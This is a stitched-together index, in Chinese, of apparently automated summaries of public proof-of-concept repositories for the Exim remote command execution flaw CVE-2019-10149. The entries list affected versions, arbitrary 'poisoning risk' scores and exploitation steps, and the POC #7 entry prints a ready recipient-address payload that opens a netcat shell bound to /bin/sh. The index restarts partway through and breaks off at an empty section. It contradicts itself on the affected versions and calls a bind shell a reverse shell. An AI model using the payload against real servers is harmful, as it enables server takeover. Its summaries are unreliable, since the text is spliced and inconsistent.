**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #14

**来源**: [CVE-2019-10149-hyim0810_CVE-2019-10149.md](../2019/CVE-2019-10149-hyim0810_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行和系统完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行受影响版本的Exim，且攻击者能够通过网络连接到SMTP端口（通常是25端口）。配置不当，如允许任意relay，会降低利用难度。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149是Exim邮件传输代理（MTA）中的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对接收者地址的不正确验证。攻击者可以通过构造包含恶意命令的特殊邮件，利用该漏洞在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞信息、搜索结果和提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个已知的、被广泛讨论和利用的漏洞。漏洞利用代码提供了详细的利用步骤，包括：

1.  安装受影响版本的Exim（4.87-4.91）。
2.  修改Exim配置以允许relay（简化利用，否则需要等待7天）。
3.  使用netcat (nc) 连接到目标Exim服务器的25端口。
4.  通过SMTP协议发送特制的邮件，其中接收者地址包含要执行的命令（hex编码）。
5.  发送DATA命令和后续数据，触发漏洞。

**投毒风险分析：**

提供的漏洞利用代码中存在一定的投毒风险，但风险较低（约10%）。

主要风险点在于`RemoteConnection.sh`脚本。该脚本的功能是建立一个反向shell，将目标服务器上的`/tmp/1`文件的内容通过`nc`命令发送到攻击者的IP地址和端口。潜在的投毒方式可能包括：

*   **替换`/tmp/1`的内容：** 攻击者可以将恶意代码写入`/tmp/1`文件，并通过反向shell在攻击者机器上执行。
*   **`RemoteConnection.sh`本身的恶意代码：** 脚本可能包含一些隐藏的后门或恶意操作，例如收集系统信息、安装rootkit等。但这个可能性较低，因为脚本相对简单且功能明确。
*   **依赖攻击者服务器的风险：** 脚本依赖于从攻击者的服务器下载`RemoteConnection.sh`，如果攻击者控制的服务器被攻陷，或者攻击者修改了`RemoteConnection.sh`脚本的内容，可能会导致受害者执行恶意代码。

漏洞利用仓库中安装的Exim版本以及对`/usr/exim/configure`文件的修改，是为了简化利用流程，使其更容易被利用。这些修改本身不是投毒代码，但降低了利用门槛，可能导致漏洞被更广泛地利用。

**利用方式总结：**

1.  **目标环境准备：** 确保目标服务器运行着受影响版本的Exim（4.87-4.91）。
2.  **网络连接：** 攻击者需要能够通过网络连接到目标服务器的25端口。
3.  **Payload构造：** 攻击者需要将要执行的命令转换为十六进制编码，并将其嵌入到SMTP `RCPT TO` 命令的接收者地址中，格式为 `<${run{hex_encoded_command}}@localhost>`。
4.  **SMTP交互：** 攻击者使用SMTP协议与目标服务器进行交互，发送`HELO`、`MAIL FROM`、`RCPT TO` 和 `DATA` 等命令，触发漏洞。
5.  **代码执行：** 漏洞触发后，Exim会执行嵌入在接收者地址中的命令，攻击者从而获得对目标服务器的控制权。

**项目地址:** [hyim0810/CVE-2019-10149](https://github.com/hyim0810/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #15

**来源**: [CVE-2019-10149-qlusec_CVE-2019-10149.md](../2019/CVE-2019-10149-qlusec_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可远程执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive), 4.92受影响

**利用条件:** 目标系统运行存在漏洞的Exim版本，且允许接收邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当，导致攻击者可以通过构造特殊的邮件，在目标服务器上执行任意命令。

**有效性：**

提供的POC代码是有效的，它展示了如何利用此漏洞执行命令。POC中的 `payload.txt` 文件构造了一个包含嵌入命令的收件人地址。`rcpt to:` 字段包含一个`${run{...}}` 块，Exim 会执行该块中的命令。

**投毒风险：**

此仓库存在一定的投毒风险。虽然 `payload.txt` 文件展示了漏洞利用方法，但 `README.md` 文件内容过于简单，缺乏漏洞的详细说明和利用注意事项。此外，POC代码中包含反弹shell的操作，可能被用于恶意目的，如果攻击者替换了原有的反弹shell代码，风险较高。
综合评估投毒风险为10%。

**利用方式：**

1.  攻击者发送一封精心构造的邮件到目标 Exim 服务器。
2.  邮件的 `RCPT TO` 字段包含一个特殊的字符串，其中嵌入了要执行的命令。`${run{...}}`是一个常见的Exim宏扩展结构。
3.  当 Exim 处理该邮件时，由于漏洞的存在，它会执行嵌入在 `RCPT TO` 字段中的命令，该命令将执行反弹shell或其它恶意操作。
4.  命令执行结果被通过 `nc` 命令发送到攻击者的服务器。

**项目地址:** [qlusec/CVE-2019-10149](https://github.com/qlusec/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #16

**来源**: [CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md](../2019/CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md)

# CVE-2019-10149

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md](../2019/CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在4.87到4.91之间，需要网络访问25端口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理 (MTA) 的 deliver_message() 函数中，由于对接收者地址验证不当导致。攻击者可以通过发送特制的电子邮件，在目标服务器上执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的利用是有效的。POC代码 `wizard.py` 模拟了SMTP交互，利用`RCPT TO`命令中的`${run{...}}` 扩展功能，执行shell命令。

**投毒风险分析：**

检查提供的`wizard.py`文件，其中的payload经过了编码，目的是为了绕过一些检测机制。解码后的命令主要完成以下操作：

*   创建一个具有SUID权限的程序 `s`。
*   该程序 `s` 拥有root权限，执行后会启动一个root shell。
*   利用`${run{}}` 在服务器上执行编译命令，生成二进制文件s，并赋予SUID权限
*   POC的最后，执行该程序 `/tmp/s` 以获取root权限。

该POC旨在提升权限，而不是注入恶意代码到服务器的持久性位置，因此不属于传统的“投毒”行为。 投毒风险：0%

**利用方式：**

1.  攻击者连接到Exim服务器的25端口。
2.  发送HELO, MAIL FROM等SMTP命令进行初始化。
3.  利用 `RCPT TO` 命令，构造包含恶意命令的接收者地址，其中使用了 `${run{...}}` 扩展功能。
4.  发送DATA命令，提供邮件内容 (实际上邮件内容对利用该漏洞来说并不重要)。
5.  利用服务器执行`${run{}}`中的命令，该命令编译一个具有SUID的程序，攻击者执行该程序以获取root权限。

**项目地址:** [AzizMea/CVE-2019-10149-privilege-escalation](https://github.com/AzizMea/CVE-2019-10149-privilege-escalation)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #2

**来源**: [CVE-2019-10149-Brets0150_StickyExim.md](../2019/CVE-2019-10149-Brets0150_StickyExim.md)

## CVE-2019-10149 Exim RCE HoneyPot

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务运行且存在漏洞版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 4.87 到 4.91 版本中存在的一个远程代码执行漏洞。该漏洞源于 `deliver_message()` 函数中对接收者地址的不当验证，攻击者可以通过构造包含恶意命令的电子邮件，利用此漏洞在目标系统上执行任意代码。

**有效性评估：**

根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、被广泛讨论的严重漏洞，并且已经被实际利用。提供的漏洞利用代码实际上是一个蜜罐脚本，用于检测针对此漏洞的攻击尝试，而不是一个直接利用漏洞的 PoC。然而，README中提到了另一个PoC：`https://github.com/cowbe0x004/eximrce-CVE-2019-10149`， 可以验证漏洞。

**投毒风险评估：**

该仓库主要功能是做一个蜜罐，用于监控Exim漏洞(CVE-2019-10149)的攻击行为。

*   `install_StickyExim.sh`: 安装和配置蜜罐，包括Exim配置和Cron Job设置
*   `honey_harvester_exim_cve-2019-10149.sh`: 核心脚本，用于解析Exim日志，检测CVE-2019-10149攻击尝试，并发送告警邮件。

审查了安装脚本和核心检测脚本。发现主要功能是监控和告警，没有发现明显的恶意代码，考虑到代码会修改Exim配置以及加入Cron Job。存在一定的风险，但是风险较低。所以判断存在10%的投毒风险。

**利用方式分析：**

此PoC本身不是用于攻击的，而是用于创建一个蜜罐来捕获攻击流量。 但是根据漏洞描述，利用方式大致如下：

1.  攻击者构造一封特殊的电子邮件，该邮件的接收者地址包含恶意命令。
2.  当 Exim 处理这封邮件时，`deliver_message()` 函数未能正确验证接收者地址，导致恶意命令被执行。
3.  攻击者可以通过这种方式在服务器上执行任意代码，从而控制服务器。

**总结：**

该漏洞是一个严重的安全漏洞，可以允许未经身份验证的远程攻击者在受影响的 Exim 服务器上执行任意代码。需要尽快修补此漏洞。

**项目地址:** [Brets0150/StickyExim](https://github.com/Brets0150/StickyExim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #3

**来源**: [CVE-2019-10149-Chris-dev1_exim.exp.md](../2019/CVE-2019-10149-Chris-dev1_exim.exp.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致完全控制受影响的服务器

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响的Exim版本，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中。这是一个远程命令执行漏洞，由于 `deliver_message()` 函数中对接收者地址的验证不当，导致攻击者可以通过发送特制的电子邮件来执行任意命令。漏洞利用方式通常涉及构造包含恶意命令的电子邮件地址，这些命令会在 Exim 处理邮件时被执行。从搜索结果和漏洞库信息来看，此漏洞已被广泛利用。提供的代码片段仅为Apache License 2.0协议，不包含任何漏洞利用或恶意代码。因此，可以判断投毒风险为0%。根据搜索结果，漏洞利用代码已经公开。

**项目地址:** [Chris-dev1/exim.exp](https://github.com/Chris-dev1/exim.exp)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #4

**来源**: [CVE-2019-10149-Diefunction_CVE-2019-10149.md](../2019/CVE-2019-10149-Diefunction_CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标服务器运行存在漏洞的Exim版本，且允许外部连接到SMTP端口（默认25端口）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。漏洞原因是Exim在`deliver_message()`函数中对收件人地址的验证不当，攻击者可以通过构造特殊的邮件收件人地址，在服务器上执行任意命令。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断此漏洞是真实存在的，且有可用的POC代码。搜索引擎结果中多个链接（例如Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire, RedHat）都确认了此漏洞的存在和高危性。CISA已将此漏洞加入已知被利用的漏洞目录(KEV)。提供的PoC脚本也证实了利用方法的可行性。

**投毒风险：**
分析提供的`exploit.py`代码，该脚本主要功能是利用SMTP协议与目标Exim服务器进行交互，构造包含恶意命令的收件人地址，从而实现远程命令执行。脚本的主要步骤包括：
1.  建立socket连接到目标服务器的25端口
2.  发送EHLO命令
3.  发送MAIL FROM命令
4.  发送RCPT TO命令，其中收件人地址包含`${run{...}}`结构，用于执行命令
5.  发送DATA命令
6.  发送包含一系列Received头的邮件正文，最后以".\r\n"结束

检查脚本代码，没有发现任何可疑的、与漏洞利用无关的代码。payload部分通过字符串格式化，将反弹shell命令注入到收件人地址中。因此，可以认为此仓库中作者隐藏投毒代码的可能性为0%。

**利用方式：**
1.  **前期准备：** 攻击者需要一台可以访问目标服务器的机器，并且需要知道目标服务器的IP地址和SMTP端口（通常是25）。攻击者还需要监听一个端口，用于接收目标服务器反弹的shell。
2.  **漏洞利用：** 攻击者运行提供的`exploit.py`脚本，指定目标服务器的IP地址、SMTP端口、攻击者自己的IP地址和监听端口。
3.  **远程命令执行：** 脚本会构造一个包含恶意命令的邮件，发送给目标服务器。当Exim处理该邮件时，会执行恶意命令，通常是反弹shell。
4.  **获取shell：** 攻击者在自己的机器上接收到反弹的shell，从而控制目标服务器。

**项目地址:** [Diefunction/CVE-2019-10149](https://github.com/Diefunction/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #5

**来源**: [CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md](../2019/CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行，完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标Exim服务器监听25端口，并且存在漏洞版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于Exim的 deliver_message() 函数中，由于对接收者地址验证不当，可能导致远程命令执行。攻击者可以通过构造特殊的邮件，在接收者地址中注入恶意命令，从而在目标服务器上执行任意代码。

**有效性评估：**
根据漏洞库信息和搜索结果，CVE-2019-10149 是一个已被确认的、高危的远程命令执行漏洞。多个安全厂商和研究人员已经发布了相关的分析和PoC代码。

**投毒风险评估：**
提供的PoC代码只有一个README.md文件，内容是关于漏洞的SNP分配，本身不包含任何可执行的代码，因此直接投毒的概率较低。但是，PoC代码仓库可能包含其他未列出的恶意文件或依赖项，所以仍然存在一定的投毒风险。根据目前的信息，投毒风险估计为10%。更完善的分析需要检查所有文件和依赖。

**利用方式：**
1.  攻击者向目标 Exim 服务器发送一封特制的电子邮件。
2.  该邮件的接收者地址中包含恶意构造的命令注入代码。
3.  当 Exim 处理该邮件时，由于 deliver_message() 函数的验证缺陷，恶意命令会被执行。
4.  攻击者从而获得目标服务器的远程代码执行权限，可以执行任意操作，如安装后门、窃取数据等。

**排序优先级说明：** 遵循 搜索引擎结果 > 漏洞利用代码 > 漏洞库信息 原则。


**项目地址:** [Dilshan-Eranda/CVE-2019-10149](https://github.com/Dilshan-Eranda/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #6

**来源**: [CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md](../2019/CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制受影响的服务器

**影响版本:** 4.87 - 4.91

**利用条件:** 需要 Exim 服务在目标机器上运行，且版本在受影响范围内，可能需要目标服务器开放25端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 邮件服务器中存在的远程命令执行漏洞。该漏洞是由于 `deliver_message()` 函数中对收件人地址的不正确验证引起的。攻击者可以通过发送特制的电子邮件利用此漏洞，从而在服务器上以 root 权限执行任意命令。

**有效性评估：**

提供的 PoC 代码 `PoC_CVE-2019-10149.py` 看起来有效。它通过 SMTP 协议与 Exim 服务器建立连接，并发送包含恶意命令的电子邮件。该命令嵌入在收件人地址中，利用了 Exim 的字符串扩展功能来执行命令。

多个来源（Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire）确认了该漏洞的存在和严重性，并指出该漏洞已被积极利用。

**投毒风险评估：**

该 PoC 代码本身相对简单，主要功能是利用漏洞执行命令。投毒的潜在风险较低，但并非完全没有。

*   **编码风险：** 代码中包含hex编码，降低了代码可读性，可能存在隐藏代码，如果hex编码混淆了正常的指令与后门代码，存在一定的风险。
*   **依赖风险：** 该脚本依赖Python3和socket，确保环境安全。
*   **维护者风险：**虽然README.md声明免责声明，但依旧存在风险，需要保持警惕。

综合考虑，该仓库的投毒风险评估在10%。

**利用方式分析：**

1.  **目标确认：** 确认目标系统运行着受影响版本的 Exim（4.87 到 4.91）。
2.  **SMTP 连接：** 使用 PoC 脚本通过 SMTP 协议连接到目标 Exim 服务器的 25 端口（或其他配置的端口）。
3.  **构造恶意邮件：** PoC 脚本构造一封包含恶意收件人地址的电子邮件。该地址利用 Exim 的字符串扩展功能来执行命令。
4.  **发送邮件：** 将构造的邮件发送到目标 Exim 服务器。
5.  **命令执行：** 如果漏洞利用成功，Exim 将以 root 权限执行嵌入在收件人地址中的命令。

**缓解措施：**

*   升级 Exim 到受影响版本之外的版本(>=4.92)。
*   禁用 Exim 的字符串扩展功能（如果可能）。
*   使用防火墙限制对 Exim 端口的访问。

**项目地址:** [MNEMO-CERT/PoC--CVE-2019-10149_Exim](https://github.com/MNEMO-CERT/PoC--CVE-2019-10149_Exim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #7

**来源**: [CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md](../2019/CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** 4.87-4.91

**利用条件:** 目标系统运行受影响版本的Exim，且允许从攻击者主机到目标机器25端口的TCP连接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim 4.87到4.91版本中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以利用此漏洞，通过构造包含恶意命令的特殊邮件，在目标系统上执行任意代码，从而完全控制系统。

**有效性分析：**
根据漏洞库信息、搜索引擎结果以及提供的PoC代码，可以确认此漏洞是真实存在的，并且PoC代码可以有效利用此漏洞。

**投毒风险分析：**
PoC代码通过`nc`在目标机器上反弹shell，监听31415端口。代码本身目的是利用漏洞，没有发现隐藏的恶意代码或后门，因此投毒风险较低，为0%。

**漏洞利用方式：**
1.  PoC首先通过`nc`连接到目标Exim服务器的25端口（SMTP）。
2.  发送`HELO`命令，声明客户端主机名。
3.  发送`MAIL FROM`命令，指定发件人地址。
4.  发送`RCPT TO`命令，指定收件人地址，其中收件人地址包含恶意的payload：`${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31415\t-e\t\x2fbin\x2fsh\x22}}@localhost`。
    *   这个payload使用了Exim的`${run{}}`扩展函数，可以在Exim进程中执行任意命令。
    *   payload的功能是执行`nc -lp 31415 -e /bin/sh`，即在目标机器上监听31415端口，并将/bin/sh绑定到该端口，相当于反弹了一个shell。
5.  发送`DATA`命令，开始邮件内容传输。
6.  发送一系列`Received:`头，用于填充邮件内容并触发漏洞（原因在于Exim对过长的头部处理可能存在问题，也可能是为了绕过某些过滤）。
7.  发送`.
`表示邮件内容结束。
8.  发送`QUIT`命令断开连接。
9.  PoC最后使用`nc localhost 31415`连接到目标机器上反弹的shell，实现远程代码执行。

**项目地址:** [Stick-U235/CVE-2019-10149-Exploit](https://github.com/Stick-U235/CVE-2019-10149-Exploit)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #8

**来源**: [CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md](../2019/CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务对外开放SMTP端口(默认25)

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以通过构造包含恶意代码的特殊收件人地址，利用`run{}`扩展函数执行任意命令。该漏洞的利用方式主要通过SMTP协议发送特制的邮件，在`RCPT TO`指令中注入恶意payload。PoC代码构造了包含payload的收件人地址，利用`${run{}}`语法执行命令。考虑到PoC作者公开了他的代码，并且投毒代码的收益比直接攻击低，因此投毒概率较低，但是仍存在一定风险。

**项目地址:** [VoyagerOnne/Exim-CVE-2019-10149](https://github.com/VoyagerOnne/Exim-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #9

**来源**: [CVE-2019-10149-aishee_CVE-2019-10149-quick.md](../2019/CVE-2019-10149-aishee_CVE-2019-10149-quick.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标系统运行存在漏洞版本的 Exim，且攻击者能够发送邮件到目标服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当导致远程命令执行。攻击者可以通过构造特殊的邮件，在收件人地址中注入恶意命令，当 Exim 处理该邮件时，这些命令会被执行，从而控制服务器。

**有效性:**
根据搜索引擎结果，该漏洞已被广泛证实存在，并且有公开的 PoC 利用代码。漏洞库信息也确认了该漏洞的存在。

**投毒风险:**
提供的 PoC 代码包含一个 Bash 脚本，用于检测目标操作系统并尝试更新 Exim 和 Curl 软件包。这个脚本本身看起来像是尝试修复漏洞，而非利用它。`README.md` 文件也描述脚本为快速修复程序。虽然脚本尝试更新软件包，但如果服务器配置不当，或者更新源被恶意篡改，也存在一定的风险。此外，`apt-get --yes --force-yes install`和 `yum install -y -q -e 0` 在没有充分验证更新源的情况下，可能安装恶意的软件包。因此，存在极小的潜在投毒风险，约为 1%。

**利用方式:**
1.  攻击者需要确定目标服务器运行的是 Exim 4.87 到 4.91 之间的易受攻击版本。
2.  攻击者构造一封包含恶意命令的电子邮件。该命令被嵌入到收件人地址中，利用了 `deliver_message()` 函数的漏洞。
3.  攻击者将构造的邮件发送到目标服务器。
4.  当 Exim 处理该邮件时，会执行嵌入在收件人地址中的恶意命令，从而导致远程代码执行。攻击者可以使用此漏洞来安装后门、窃取敏感信息或执行其他恶意操作。

**项目地址:** [aishee/CVE-2019-10149-quick](https://github.com/aishee/CVE-2019-10149-quick)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #10

**来源**: [CVE-2019-10149-bananaphones_exim-rce-quickfix.md](../2019/CVE-2019-10149-bananaphones_exim-rce-quickfix.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响版本的Exim，且漏洞未被修复

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，是由于 `deliver_message()` 函数中对接收者地址验证不当造成的远程命令执行漏洞。攻击者可以通过构造特殊的邮件，利用该漏洞在目标服务器上执行任意命令。

**有效性评估：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞的POC代码是有效的。搜索引擎结果显示该漏洞已被广泛利用，并且有活跃的Linux蠕虫利用此漏洞传播。漏洞利用代码中的 `exim_rce_fixer.sh` 脚本尝试更新 Exim 并移除恶意软件，表明存在利用该漏洞植入的恶意程序。

**投毒风险分析：**
提供的脚本 `exim_rce_fixer.sh` 旨在修复漏洞并清理恶意软件，但它本身可能存在投毒风险。脚本尝试删除与 `tor2web` 相关的恶意软件，更新 Exim，并删除可疑的 cron 任务和 authorized_keys 条目。但是，如果脚本未能完全清除恶意软件，或者脚本本身包含恶意代码，则可能导致系统受损。此外，脚本强制重启服务器，这可能导致数据丢失或服务中断。

`malware_do_not_run.sh` 脚本明确包含连接到 Tor 网络的行为，并尝试下载和执行恶意代码。尽管文件名暗示不要运行，但攻击者可以通过该脚本植入恶意软件。

综合考虑，脚本中清理恶意软件的部分看起来是合法的，但 `malware_do_not_run.sh` 脚本和`exim_rce_fixer.sh`脚本潜在的清理不完全和强制重启行为构成了投毒风险。

**利用方式：**
1.  攻击者构造包含恶意命令的特殊邮件。
2.  Exim 在处理邮件时，由于对接收者地址验证不当，将恶意命令传递给系统 shell 执行。
3.  攻击者从而在目标服务器上获得远程代码执行权限。
4.  攻击者可能利用该权限安装恶意软件，窃取数据，或控制服务器。

**项目地址:** [bananaphones/exim-rce-quickfix](https://github.com/bananaphones/exim-rce-quickfix)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #11

**来源**: [CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md](../2019/CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行存在漏洞的Exim版本，并且攻击者可以向Exim服务器发送邮件。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理（MTA）的 deliver_message() 函数中，由于对收件人地址的验证不当导致。未经身份验证的远程攻击者可以通过向目标服务器发送特制的邮件来利用此漏洞，从而在目标系统上执行任意命令。漏洞利用通常涉及在邮件收件人地址中注入 shell 命令。 

根据提供的漏洞利用代码，`/tmp/b373ced1c77bc05f74b9541e06f0010c/README.md`文件主要包含关于CVE-2019-10149、CVE-2019-15846 和 CVE-2019-16928漏洞的相关信息收集，包括漏洞公告、漏洞利用详情、问题时间线、NSA公告以及受影响的IP、ASN、国家和主机名等数据链接。其中`election-domains-by-expiration-date.txt`文件是域名列表, 不太可能直接用于漏洞利用，但是可能被用于信息收集或后续攻击。

**有效性：** 根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在公开的漏洞利用代码，因此可以判断提供的漏洞利用代码是有效的。

**投毒风险：** 该仓库中存在的投毒代码可能性较低，主要是因为其内容以漏洞信息搜集为主，提供的数据源链接也是公开信息。`election-domains-by-expiration-date.txt`可能存在搜集来的恶意域名，但作者进行恶意添加的可能性较低。

**利用方式：** 攻击者构造包含恶意命令的邮件，利用Exim在处理收件人地址时的验证缺陷，将命令注入到系统执行。这通常通过在收件人地址中嵌入反引号或者其他命令执行符号来实现。该漏洞允许攻击者远程执行代码而无需身份验证。

**项目地址:** [cloudflare/exim-cve-2019-10149-data](https://github.com/cloudflare/exim-cve-2019-10149-data)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #12

**来源**: [CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md](../2019/CVE-2019-10149-cowbe0x004_eximrce-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程命令执行和系统被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** Exim服务对外开放，攻击者能够发送恶意构造的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，由于 `deliver_message()` 函数对接收者地址验证不当，攻击者可以通过发送特制的邮件，在目标服务器上执行任意命令。从提供的漏洞利用代码来看，利用方式主要有两种：

1.  **本地检测脚本 (eximioc.sh):**  此脚本用于在目标服务器本地运行，检测是否存在漏洞利用的迹象，例如检查Exim版本、cPanel版本以及是否存在异常进程 `kthrotlds`。

2.  **远程利用脚本 (eximrce.py):**  此脚本用于远程触发漏洞。它通过socket连接到目标服务器的Exim服务端口，发送包含恶意payload的邮件。Payload利用 `${run{...}}` 结构在服务器上执行命令，例如创建一个文件 `/root/lweximtest`。如果文件创建成功，则表明服务器存在远程命令执行漏洞。

**漏洞利用方式总结:**

*   攻击者构造包含恶意recipient地址的邮件。
*   邮件被发送到运行存在漏洞的Exim服务器。
*   Exim服务器在处理邮件时，由于recipient地址验证不当，执行了恶意payload中的命令。
*   攻击者在服务器上执行任意命令。

**投毒风险分析:**

